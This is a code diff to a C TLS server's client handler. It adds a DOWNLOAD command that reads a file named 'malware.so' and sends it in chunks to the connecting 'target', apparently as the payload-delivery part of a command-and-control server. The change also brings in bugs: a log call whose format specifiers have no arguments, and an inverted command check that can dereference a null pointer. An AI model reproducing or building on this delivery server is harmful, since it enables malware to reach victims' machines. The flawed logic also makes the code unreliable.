@@ -47,7 +47,7 @@ void *handleClient(void *arg) {
       memset(buffer, 0, sizeof(buffer));
       int len = SSL_read(client->ssl, buffer, sizeof(buffer));
       if (len <= 0) {
-          printLog("[LOG][id: %d - from: %s] Connexion closed or SSL_read failed\n",
+          printLog("[LOG][id: %d - from: %s] closed or SSL_read failed\n",
                    client->client, client->ip);
           goto cleanup;
       }
@@ -55,13 +55,43 @@ void *handleClient(void *arg) {
       buffer[len] = '\0';
       buffer[strcspn(buffer, "\r\n")] = '\0'; 
 
-      printLog("[LOG][id: %d - from: %s] Message received: %s\n\n",
+      printLog("[LOG][id: %d - from: %s] Message received: %s\n",
                client->client, client->ip, buffer);
 
       char *saveTOK;
       char *clientinput = strtok_r(buffer, " ", &saveTOK);
 
-      if (!clientinput || strncmp(clientinput, API_COMMAND, strlen(API_COMMAND)) != 0) {
+      if (clientinput && strncmp(clientinput, DOWNLOAD_COMMAND, strlen(DOWNLOAD_COMMAND)) == 0) {
+        if (strtok_r(NULL, " ", &saveTOK) != NULL ) {
+          printLog("[ERR][id: %d - from: %s] Too many arguments\n", client->client, client->ip);
+          goto cleanup;
+        }
+        
+        FILE *file = fopen("malware.so", "rb");
+        if (!file) {
+          printLog("[ERR] Failed to open the malware.so file!\n");
+          SSL_write(client->ssl, "failed\n", 7 );
+          goto cleanup;
+        }
+
+        char fileBuffer[CHUNK_SIZE];
+        size_t bytesRead;
+
+        while ((bytesRead = fread(fileBuffer, 1, sizeof(fileBuffer), file)) > 0) {
+          if (SSL_write(client->ssl, fileBuffer, bytesRead) <= 0) {
+            printLog("[ERR] Failed to send filebuffer to target \n");
+            break;
+          }
+        }
+
+        printLog("[LOG][id: %d - from: %s] File send succesfully\n");
+        fclose(file);
+        goto cleanup;
+
+      }
+
+
+      if (!clientinput && strncmp(clientinput, API_COMMAND, strlen(API_COMMAND)) != 0) {
           printLog("[LOG][id: %d - from: %s] Invalid or missing command\n",
                    client->client, client->ip);
           continue;
@@ -136,8 +166,6 @@ void *ListenToClient(void *arg){
       printLog("[LOG] SSL_set_fd failed\n");
       exit(-1);
     }
-
-    printf("Before ssl accept\n");
 
     int ret = SSL_accept(client->ssl);
     if (ret <= 0) {
